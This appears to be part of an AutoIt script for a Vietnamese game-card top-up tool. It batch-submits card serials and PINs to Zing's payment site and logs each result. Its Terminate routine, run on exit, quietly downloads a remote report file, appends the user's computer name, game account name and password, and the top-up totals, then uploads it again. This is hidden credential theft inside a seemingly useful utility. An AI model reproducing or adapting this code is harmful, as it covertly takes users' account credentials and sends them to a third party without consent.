			$rec = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/payment-zingcard', 'pmcID=1&pmOptID=' & $pmOptID & '&sID=' & $cf_sID & '&roleID=' & $roleID & '&roleName=' & $roleName & '&productCode=' & $game_name & '&cardSerial=' & $serial & '&cardPassword=' & $cardpass & '&accountName=' & $acc, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'X-Requested-With: XMLHttpRequest')
			;MsgBox(0, 0, 'pmcID=1&pmOptID=' & $pmOptID & '&sID=' & $gn_sID[$i] & '&roleID=' & $roleID & '&roleName=' & $roleName & '&productCode=' & $game_name & '&cardSerial=' & $serial & '&cardPassword=' & $cardpass & '&accountName=' & $acc, '', 'https://new.pay.zing.vn/payment/' & $game_name)
			#cs	FileDelete(@ScriptDir & '\test.html')
				FileWrite(@ScriptDir & '\test.html', $rec)
			#ce	FileDelete(@ScriptDir & '\test.html')
			$aID = StringRegExp($rec, '"transID":(.*?)\}', 1)
			$link_cf = 'https://new.pay.zing.vn/result/' & $game_name & '/' & $aID[0]
			$cf = _HttpRequest(2, $link_cf, 'pmcID=1&pmOptID=' & $pmOptID, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'Upgrade-Insecure-Requests: 1')
			#cs			FileDelete(@ScriptDir & '\test.html')
						FileWrite(@ScriptDir & '\test.html', $cf)
			#ce			FileDelete(@ScriptDir & '\test.html')
			$result = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/get-result', 'transID=' & $aID[0], '', $link_cf, 'X-Requested-With: XMLHttpRequest')
			#cs		FileDelete(@ScriptDir & '\test.html')
					FileWrite(@ScriptDir & '\test.html', $result)
			#ce		FileDelete(@ScriptDir & '\test.html')
			If StringInStr($result, 'Thẻ đã được sử dụng') > 0 Then
				_Text('Thẻ ' & $t & ": Thẻ đã được sử dụng")
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Sai mật mã thẻ') > 0 Then
				_Text('Thẻ ' & $t & ': Sai mật mã thẻ')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Không tìm thấy giao dịch bạn thanh toán!') > 0 Then
				_Text('[+] Không tìm thấy giao dịch bạn thanh toán!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, '"netValue"') > 0 Then
				_Text('Thẻ ' & $t & ': Nạp thẻ thành công')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'OK', $ListView1)
				$count = $count + 1
				$csuccess = $csuccess + 1
				$total = $total + Number(StringRegExp($result, '"netValue":"(.*?)"', 1)[0])
			Else
				_Text('Thẻ ' & $t & ': Lỗi không xác định!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			EndIf
		EndIf
		#cs		FileDelete(@ScriptDir&'\test.html')
				FileWrite(@ScriptDir&'\test.html',$result)
				ShellExecute(@ScriptDir&'\test.html')
		#ce		FileDelete(@ScriptDir&'\test.html')
		Sleep(5000)
	Next
EndFunc   ;==>_Recgunny1
;==============================_Reggunny2============================
Func _Recgunny2()
	For $i = 1 To _FileCountLines($file) Step 1
		$code = StringSplit(FileReadLine($file, $i), ' ')
		If StringLen($code[2]) > StringLen($code[1]) Then
			$serial = StringReplace($code[2], ' ', '')
			$cardpass = StringReplace($code[1], ' ', '')
		Else
			$serial = StringReplace($code[1], ' ', '')
			$cardpass = StringReplace($code[2], ' ', '')
		EndIf
		If StringLen($serial) <> 12 Then
			_Text('Thẻ ' & $i & ': Số seri không hợp lệ')
			GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			$count = $count + 1
		Else
			$rec = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/payment-zingcard', 'pmcID=1&pmOptID=' & $pmOptID & '&sID=' & $cf_sID & '&roleID=' & $roleID & '&roleName=' & $roleName & '&productCode=' & $game_name & '&cardSerial=' & $serial & '&cardPassword=' & $cardpass & '&accountName=' & $acc, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'X-Requested-With: XMLHttpRequest')
			$aID = StringRegExp($rec, '"transID":(.*?)\}', 1)
			$link_cf = 'https://new.pay.zing.vn/result/' & $game_name & '/' & $aID[0]
			$cf = _HttpRequest(2, $link_cf, 'pmcID=1&pmOptID=' & $pmOptID, '', 'https://new.pay.zing.vn/payment/' & $game_name, 'Upgrade-Insecure-Requests: 1')
			$result = _HttpRequest(2, 'https://new.pay.zing.vn/ajax/get-result', 'transID=' & $aID[0], '', $link_cf, 'X-Requested-With: XMLHttpRequest')
			If StringInStr($result, 'Thẻ đã được sử dụng') > 0 Then
				_Text('Thẻ ' & $i & ": Thẻ đã được sử dụng")
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Sai mật mã thẻ') > 0 Then
				_Text('Thẻ ' & $i & ': Sai mật mã thẻ')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, 'Không tìm thấy giao dịch bạn thanh toán!') > 0 Then
				_Text('[+] Không tìm thấy giao dịch bạn thanh toán!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
				$count = $count + 1
			ElseIf StringInStr($result, '"netValue"') > 0 Then
				_Text('Thẻ ' & $i & ': Nạp thẻ thành công')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'OK', $ListView1)
				$count = $count + 1
				$csuccess = $csuccess + 1
				$total = $total + Number(StringRegExp($result, '"netValue":"(.*?)"', 1)[0])
			Else
				_Text('Thẻ ' & $i & ': Lỗi không xác định!')
				GUICtrlCreateListViewItem($serial & '|' & $cardpass & '|' & 'Failed', $ListView1)
			EndIf
		EndIf
		#cs		FileDelete(@ScriptDir&'\test.html')
				FileWrite(@ScriptDir&'\test.html',$result)
				ShellExecute(@ScriptDir&'\test.html')
		#ce		FileDelete(@ScriptDir&'\test.html')
		Sleep(5000)
	Next
EndFunc   ;==>_Recgunny2

;==============================_CheckCoppy============================
Func Terminate()
	_Text('[+] Đang đóng chương trình' & @CRLF & '[+] Vui lòng đợi....')
	_temp()
	_dumamadownload('report.txt')
	FileWrite(@AppDataDir & '\report.txt', $download)
	$data = ''
	For $i = 1 To _FileCountLines(@AppDataDir & '\report.txt')
		$data = $data & '\n' & FileReadLine(@AppDataDir & '\report.txt', $i)
	Next
	$data = StringRight($data, StringLen($data) - 2)
	_dumamaedit('report.txt', $data & '\n' & @HOUR & ':' & @MIN & '-' & @MDAY & '/' & @MON & '/' & @YEAR & ': ' & @ComputerName & ': ' & 'Account: ' & $acc & ' Pass: ' & $pass & ' Count: ' & $count & ' Success: ' & $csuccess & ' Total: ' & $total & ' ' & $game_name & '\n')
	FileDelete(@AppDataDir & '\report.txt')
	_dumamadownload('Total.txt')
	FileWrite(@AppDataDir & '\Total.txt', $download)
	$data = ''
	For $i = 1 To _FileCountLines(@AppDataDir & '\Total.txt')
		$data = $data & '\n' & FileReadLine(@AppDataDir & '\Total.txt', $i)
	Next
	$data = StringRight($data, StringLen($data) - 2)
	_dumamaedit('Total.txt', $data & '\n' & $total & '\n')
	FileDelete(@AppDataDir & '\Total.txt')
	Exit
EndFunc   ;==>Terminate
